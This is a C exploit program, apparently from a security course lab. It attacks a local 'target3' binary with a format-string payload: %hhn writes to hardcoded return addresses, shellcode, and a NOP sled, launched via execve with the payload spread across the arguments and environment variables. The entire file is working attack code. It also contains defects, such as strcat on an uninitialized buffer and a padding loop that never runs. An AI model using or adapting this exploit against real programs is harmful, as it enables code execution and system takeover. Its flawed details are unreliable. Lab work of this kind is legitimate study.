#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define NOP 0x90

int main(void) {
    char *args[3];
    char *env[41];

    char buffer[256];
    char attackString[196];

    long *bufferLong = (long *)buffer;

    // Setup the return addresses in the buffer
    bufferLong[0] = 0x3021fea8;
    bufferLong[2] = 0x3021fea9;
    bufferLong[4] = 0x3021feaa;
    bufferLong[6] = 0x3021feab;

    // Fill with NOPs
    for (int i = 56; i < 60; i++) {
        buffer[i] = NOP;
    }

    // Create format string
    char formatString[151] = "%117x%1x%1x%hhn%90x%hhn%39x%hhn%15x%hhn";
    for (int i = sizeof(formatString); i < 150; i++) {
        formatString[i] = NOP;
    }
    formatString[150] = '\0';

    // Construct the attack string
    strcat(attackString, shellcode);
    strcat(attackString, formatString);

    // Append attackString to buffer
    strcpy(buffer + 60, attackString);

    // Setup args
    args[0] = TARGET; 
    args[1] = buffer; 
    args[2] = NULL;

    // Fill environment variables
    int envIndex = 0;
    int bufferRanges[4][2] = {{5,16},{21,32},{37,48},{53,56}};
    for(int r = 0; r < 4; r++) {
        for (int i = bufferRanges[r][0]; i <= bufferRanges[r][1]; i++) {
            env[envIndex++] = &buffer[i];
        }
    }

    env[40] = NULL;

    if (execve(TARGET, args, env) < 0) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}